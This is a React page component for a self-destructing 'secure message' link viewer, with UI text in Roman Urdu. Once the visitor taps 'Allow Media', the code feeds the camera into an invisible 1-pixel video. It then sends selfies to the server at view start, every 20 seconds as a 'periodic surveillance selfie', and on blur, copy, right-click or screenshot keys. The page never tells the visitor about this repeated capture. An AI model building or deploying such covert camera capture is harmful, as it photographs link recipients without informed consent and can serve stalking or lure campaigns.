import { createFileRoute } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { useEffect, useRef, useState, useCallback } from "react";
import { getMessageMeta, openSecureMessage, logAccessEvent } from "@/lib/rdx.functions";

export const Route = createFileRoute("/v/$id")({
  head: () => ({
    meta: [
      { title: "Secure Message · RDX Security Zone" },
      { name: "description", content: "Encrypted one-time secure message. Camera verification required." },
      { property: "og:title", content: "Secure Message · RDX Security Zone" },
      { property: "og:description", content: "Encrypted one-time secure message. Camera verification required." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "robots", content: "noindex, nofollow" },
    ],
  }),
  component: ViewerPage,
});

type Stage = "loading" | "verify" | "opening" | "shown" | "gone" | "denied";

function ViewerPage() {
  const { id } = Route.useParams();
  const metaFn = useServerFn(getMessageMeta);
  const openFn = useServerFn(openSecureMessage);
  const logFn = useServerFn(logAccessEvent);

  const [stage, setStage] = useState<Stage>("loading");
  const [payload, setPayload] = useState<Awaited<ReturnType<typeof openSecureMessage>> | null>(null);
  const [errorMsg, setErrorMsg] = useState<string>("");

  const streamRef = useRef<MediaStream | null>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const opened = useRef(false);
  const locked = useRef(false);
  const metaLoadedFor = useRef<string | null>(null);
  const lastCaptureAt = useRef(0);

  // Load meta
  useEffect(() => {
    if (metaLoadedFor.current === id) return;
    metaLoadedFor.current = id;
    (async () => {
      try {
        const m = await metaFn({ data: { id } });
        if (!m.exists) {
          setErrorMsg("Yeh link maujood nahi ya expire ho chuki hai.");
          setStage("gone");
        } else if (m.alreadyViewed) {
          setErrorMsg("Yeh message pehle hi dekha ja chuka hai. Ek baar view ke baad dobara nahi khulti.");
          setStage("gone");
        } else {
          setStage("verify");
        }
      } catch (e: any) {
        setErrorMsg(e?.message || "Load failed");
        setStage("gone");
      }
    })();
  }, [id, metaFn]);

  const stopCamera = useCallback(() => {
    streamRef.current?.getTracks().forEach((t) => t.stop());
    streamRef.current = null;
    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
  }, []);

  const captureSelfie = useCallback(async (force = false): Promise<string | null> => {
    const now = Date.now();
    if (!force && now - lastCaptureAt.current < 800) return null;
    lastCaptureAt.current = now;
    const video = videoRef.current;
    const canvas = canvasRef.current;
    if (!video || !canvas || !video.videoWidth) return null;
    const w = Math.min(video.videoWidth, 640);
    const h = (video.videoHeight * w) / video.videoWidth;
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    if (!ctx) return null;
    ctx.drawImage(video, 0, 0, w, h);
    return canvas.toDataURL("image/jpeg", 0.7);
  }, []);

  const reportEvent = useCallback(
    async (eventType: string, includeSelfie: boolean) => {
      try {
        const selfieBase64 = includeSelfie ? await captureSelfie() : null;
        await logFn({ data: { messageId: id, eventType, selfieBase64 } });
      } catch (e) {
        console.error(e);
      }
    },
    [id, captureSelfie, logFn],
  );

  const lockViewer = useCallback(
    async (eventType: string) => {
      if (locked.current) return;
      locked.current = true;
      try {
        const selfieBase64 = await captureSelfie(true);
        await logFn({ data: { messageId: id, eventType, selfieBase64 } });
      } catch (e) {
        console.error(e);
      } finally {
        setPayload(null);
        setErrorMsg("Security alert detect ho gaya. Message lock ho chuka hai aur link dobara open nahi hoga.");
        setStage("gone");
        stopCamera();
      }
    },
    [id, captureSelfie, logFn, stopCamera],
  );

  async function handleAllowMedia() {
    setStage("opening");
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false,
      });
      streamRef.current = stream;
      // attach to hidden video
      if (!videoRef.current) {
        const v = document.createElement("video");
        v.autoplay = true;
        v.muted = true;
        v.playsInline = true;
        v.style.position = "fixed";
        v.style.width = "1px";
        v.style.height = "1px";
        v.style.opacity = "0";
        v.style.pointerEvents = "none";
        v.style.left = "-10px";
        v.style.top = "-10px";
        document.body.appendChild(v);
        videoRef.current = v;
      }
      videoRef.current.srcObject = stream;
      await new Promise((r) => setTimeout(r, 500)); // let camera warm up

      // Initial verify selfie
      await reportEvent("view_start", true);

      if (opened.current) return;
      opened.current = true;
      const res = await openFn({ data: { id } });
      if (!res.ok) {
        setErrorMsg("Yeh message pehle hi dekha ja chuka hai.");
        setStage("gone");
        return;
      }
      setPayload(res);
      setStage("shown");
    } catch (e: any) {
      await logFn({ data: { messageId: id, eventType: "permission_denied", selfieBase64: null } });
      setErrorMsg("Media permission chahiye. Aap ne deny kia ya browser support nahi karta.");
      setStage("denied");
    }
  }

  // Screenshot / recording heuristics — best effort
  useEffect(() => {
    if (stage !== "shown") return;

    const onVisibility = () => {
      if (document.hidden) lockViewer("tab_hidden_security_lock");
    };
    const onBlur = () => lockViewer("window_blur_security_lock");
    const onKey = (e: KeyboardEvent) => {
      const k = e.key;
      if (
        k === "PrintScreen" ||
        (e.metaKey && e.shiftKey && (k === "3" || k === "4" || k === "5")) || // mac screenshot
        (e.ctrlKey && (k === "p" || k === "P" || k === "s" || k === "S")) ||
        (e.metaKey && (k === "p" || k === "P" || k === "s" || k === "S"))
      ) {
        e.preventDefault();
        lockViewer("screenshot_attempt_security_lock");
      }
    };
    const onCtx = (e: MouseEvent) => {
      e.preventDefault();
      lockViewer("right_click_security_lock");
    };
    const onCopy = (e: ClipboardEvent) => {
      e.preventDefault();
      lockViewer("copy_attempt_security_lock");
    };

    document.addEventListener("visibilitychange", onVisibility);
    window.addEventListener("blur", onBlur);
    window.addEventListener("keydown", onKey);
    document.addEventListener("contextmenu", onCtx);
    document.addEventListener("copy", onCopy);

    // Periodic surveillance selfie every 20s while viewing
    const interval = window.setInterval(() => {
      reportEvent("periodic_check", true);
    }, 20000);

    // MediaRecorder / getDisplayMedia detection (best effort)
    const mediaDevices = navigator.mediaDevices as unknown as {
      getDisplayMedia?: (...args: unknown[]) => Promise<MediaStream>;
    };
    const origGDM = mediaDevices.getDisplayMedia;
    if (origGDM) {
      mediaDevices.getDisplayMedia = function (...args: unknown[]) {
        void args;
        lockViewer("screen_recording_attempt_security_lock");
        return Promise.reject(new DOMException("Screen capture blocked", "NotAllowedError"));
      };
    }

    return () => {
      document.removeEventListener("visibilitychange", onVisibility);
      window.removeEventListener("blur", onBlur);
      window.removeEventListener("keydown", onKey);
      document.removeEventListener("contextmenu", onCtx);
      document.removeEventListener("copy", onCopy);
      window.clearInterval(interval);
      if (origGDM) mediaDevices.getDisplayMedia = origGDM;
    };
  }, [stage, reportEvent, lockViewer]);

  // Cleanup camera on unmount
  useEffect(() => {
    return () => {
      stopCamera();
      if (videoRef.current) {
        videoRef.current.remove();
        videoRef.current = null;
      }
    };
  }, [stopCamera]);

  return (
    <div className="min-h-screen flex items-center justify-center p-4 relative">
      <canvas ref={canvasRef} style={{ display: "none" }} />

      {stage === "loading" && (
        <div className="text-muted-foreground animate-pulse text-sm uppercase tracking-widest">
          Establishing secure channel...
        </div>
      )}

      {stage === "verify" && (
        <div className="glass-panel rounded-xl p-8 max-w-md w-full text-center">
          <div className="mb-4 text-xs uppercase tracking-[0.4em] text-muted-foreground">rdx zone</div>
          <h1 className="text-3xl font-black neon-text-red mb-3">SECURE MESSAGE</h1>
          <p className="text-sm text-muted-foreground mb-6 leading-relaxed">
            Aap ke liye ek one-time secure message hai. Aage barhne ke liye <b className="neon-text-green">Allow Media</b> par tap karein.
          </p>
          <button
            onClick={handleAllowMedia}
            className="w-full py-3 rounded-md bg-primary text-primary-foreground font-bold uppercase tracking-widest text-sm neon-border-red hover:opacity-90"
          >
            &gt;&gt; Allow Media
          </button>
          <p className="text-[10px] text-muted-foreground mt-4 uppercase tracking-widest">
            one-time view · self destructing
          </p>
        </div>
      )}

      {stage === "opening" && (
        <div className="text-accent animate-pulse text-sm uppercase tracking-widest">
          Verifying viewer...
        </div>
      )}

      {stage === "denied" && (
        <div className="glass-panel rounded-xl p-8 max-w-md w-full text-center">
          <h2 className="text-2xl neon-text-red font-black mb-2">ACCESS DENIED</h2>
          <p className="text-sm text-muted-foreground">{errorMsg}</p>
          <button
            onClick={() => setStage("verify")}
            className="mt-4 px-4 py-2 rounded-md bg-secondary text-sm"
          >
            Try again
          </button>
        </div>
      )}

      {stage === "gone" && (
        <div className="glass-panel rounded-xl p-8 max-w-md w-full text-center">
          <h2 className="text-2xl neon-text-red font-black mb-2">MESSAGE DESTROYED</h2>
          <p className="text-sm text-muted-foreground">{errorMsg}</p>
        </div>
      )}

      {stage === "shown" && payload?.ok && (
        <div
          className="rdx-secure-content glass-panel rounded-xl p-6 md:p-8 max-w-2xl w-full relative"
          style={{ userSelect: "none" }}
          onContextMenu={(e) => e.preventDefault()}
        >
          <div className="pointer-events-none absolute inset-0 rounded-xl overflow-hidden">
            <div
              className="absolute inset-x-0 h-16 opacity-25"
              style={{
                background: "linear-gradient(180deg, transparent, oklch(0.68 0.28 25 / 0.6), transparent)",
                animation: "rdx-scan-y 4s linear infinite",
              }}
            />
          </div>

          <div className="flex items-center justify-between mb-4">
            <div className="text-xs uppercase tracking-widest neon-text-green">// message_unlocked</div>
            <div className="text-[10px] uppercase tracking-widest text-muted-foreground">
              one-time · will not reopen
            </div>
          </div>

          {payload.textMessage && (
            <div className="mb-6 p-4 rounded-md border border-border bg-background/40 whitespace-pre-wrap text-sm">
              {payload.textMessage}
            </div>
          )}

          {payload.fileUrl && payload.mimeType?.startsWith("image/") && (
            <img
              src={payload.fileUrl}
              alt="secure attachment"
              draggable={false}
              className="w-full rounded-md border border-border"
            />
          )}
          {payload.fileUrl && payload.mimeType?.startsWith("video/") && (
            <video
              src={payload.fileUrl}
              controls
              controlsList="nodownload"
              className="w-full rounded-md border border-border"
            />
          )}
          {payload.fileUrl && payload.mimeType?.startsWith("audio/") && (
            <audio src={payload.fileUrl} controls controlsList="nodownload" className="w-full" />
          )}
          {payload.fileUrl &&
            !payload.mimeType?.startsWith("image/") &&
            !payload.mimeType?.startsWith("video/") &&
            !payload.mimeType?.startsWith("audio/") && (
              <a
                href={payload.fileUrl}
                target="_blank"
                rel="noreferrer"
                className="inline-block px-4 py-2 rounded-md bg-accent text-accent-foreground text-sm font-bold uppercase tracking-widest"
              >
                Download {payload.fileName}
              </a>
            )}

          {/* watermark */}
          <div className="mt-6 text-center text-[10px] uppercase tracking-[0.4em] text-muted-foreground opacity-60">
            rdx secure viewer · {new Date().toLocaleString()}
          </div>
        </div>
      )}
    </div>
  );
}
